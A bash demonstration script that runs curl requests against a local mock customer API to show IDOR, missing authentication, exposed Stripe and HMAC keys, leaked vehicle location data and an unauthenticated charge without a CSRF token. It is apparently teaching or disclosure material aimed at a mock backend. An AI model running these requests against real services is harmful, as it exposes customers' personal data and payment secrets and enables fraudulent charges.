#!/bin/bash

API="http://localhost:8000"

echo ""
echo "======================================================================"
echo "MOCK SPACES - VULNERABILITY DEMONSTRATION"
echo "======================================================================"
echo ""

if ! curl -s "$API/health" > /dev/null 2>&1; then
    echo "ERROR: API not running!"
    echo "Start it with: python mock_backend.py"
    exit 1
fi

echo "✅ API is running!"
echo ""

echo "=== DEMO 1: Access Customer 1001 ==="
echo "Command: curl $API/customer-api/v1/user/profile/1001"
curl -s "$API/customer-api/v1/user/profile/1001"
echo ""
echo "Press Enter..."
read

echo ""
echo "=== DEMO 2: Access Customer 1002 (WITHOUT AUTH) ==="
echo "Command: curl $API/customer-api/v1/user/profile/1002"
curl -s "$API/customer-api/v1/user/profile/1002"
echo ""
echo "⚠️  IDOR: Different customer, no authentication needed!"
echo "Press Enter..."
read

echo ""
echo "=== DEMO 3: Get all customers (NO AUTH) ==="
echo "Command: curl $API/customer-api/v1/all-customers?limit=5"
curl -s "$API/customer-api/v1/all-customers?limit=5"
echo ""
echo "⚠️  No authentication required!"
echo "Press Enter..."
read

echo ""
echo "=== DEMO 4: Exposed keys ==="
echo "Command: curl $API/config/keys"
curl -s "$API/config/keys"
echo ""
echo "⚠️  Stripe and HMAC keys are PUBLIC!"
echo "Press Enter..."
read

echo ""
echo "=== DEMO 5: Get vehicle info ==="
echo "Command: curl $API/customer-api/v1/user/vehicle/1001"
curl -s "$API/customer-api/v1/user/vehicle/1001"
echo ""
echo "⚠️  Vehicle location and license exposed!"
echo "Press Enter..."
read

echo ""
echo "=== DEMO 6: Charge customer (CSRF) ==="
echo "Command: curl -X POST $API/customer-api/v1/charge?customer_id=1001&amount=99.99"
curl -s -X POST "$API/customer-api/v1/charge?customer_id=1001&amount=99.99"
echo ""
echo "⚠️  Charged without CSRF token!"
echo ""

echo ""
echo "======================================================================"
echo "VULNERABILITIES DEMONSTRATED:"
echo "======================================================================"
echo "✗ IDOR - Access any customer data"
echo "✗ No Auth - Anyone can access endpoints"
echo "✗ Exposed Keys - Stripe/HMAC keys public"
echo "✗ CSRF - No token validation"
echo "✗ Data Exposure - Vehicle, payment, location info"
echo ""
